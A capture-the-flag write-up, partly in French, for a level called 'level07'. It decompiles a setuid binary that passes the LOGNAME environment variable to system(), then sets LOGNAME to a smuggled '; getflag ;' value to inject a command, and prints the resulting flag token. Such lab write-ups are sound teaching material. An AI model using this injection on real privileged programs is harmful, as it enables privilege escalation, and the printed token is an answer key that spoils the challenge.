# level07

```bash
$ ls
level07
$ file level07
level07: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0x26457afa9b557139fa4fd3039236d1bf541611d0, not stripped
$ ./level07
level07
$ ./level07 getflag
level07
```

```bash
$ scp -P 4242 level07@192.168.179.131:/home/user/level07/level07 .
$ ghidra level07
```

```c
int main(int argc,char **argv,char **envp)
{
  char *pcVar1;
  int iVar2;
  char *buffer;
  gid_t gid;
  uid_t uid;
  char *local_1c;
  __gid_t local_18;
  __uid_t local_14;

  local_18 = getegid();
  local_14 = geteuid();
  setresgid(local_18,local_18,local_18);
  setresuid(local_14,local_14,local_14);
  local_1c = (char *)0x0;
  pcVar1 = getenv("LOGNAME");
  asprintf(&local_1c,"/bin/echo %s ",pcVar1);
  iVar2 = system(local_1c);
  return iVar2;
}
```

Le binaire créer une string dans local_1c qui contient “/bin/echo “ et la valeur de la variable d’environnement LOGNAME, qui devait donc être level07, il nous suffit de modifier cette variable afin d’exécuter `getflag`

```c
$ env | grep "LOGNAME"
LOGNAME=level07
export LOGNAME="; getflag ;"
$ env | grep "LOGNAME"
LOGNAME=; getflag ;
$ ./level07

Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
```
